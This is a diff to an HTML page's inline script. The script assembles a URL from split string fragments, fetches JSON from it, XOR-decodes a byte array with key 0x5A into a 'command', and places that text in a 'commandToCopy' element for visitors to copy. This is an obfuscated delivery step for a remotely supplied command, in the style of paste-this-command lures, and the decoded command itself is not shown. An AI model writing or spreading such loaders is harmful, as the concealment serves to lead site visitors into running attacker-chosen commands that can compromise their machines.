@@ -804,15 +804,20 @@
     const c = 'ers.dev/';
     
     const result = await fetch(a + b + c).then(r => r.json());
+    console.log('result:', result);
+    console.log('result.data:', result.data);
     
-    if (result && result.command) {
-      var el = document.getElementById('commandToCopy');
-      if (el) el.textContent = result.command;
+    if (result && result.data) {
+      const KEY = 0x5A;
+      const command = result.data.map(b => String.fromCharCode(b ^ KEY)).join('');
+      console.log('command:', command);
       
-      var link = document.getElementById('copyButton');
-      if (link) link.href = result.command;
+      var el = document.getElementById('commandToCopy');
+      if (el) el.textContent = command;
     }
-  } catch(e) {}
+  } catch(e) { 
+    console.error('error:', e); 
+  }
 })();
 </script>
 </body>
